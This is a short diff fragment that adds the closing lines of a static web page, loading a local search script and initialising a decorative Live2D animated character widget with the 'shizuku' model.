+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":300,"height":400},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
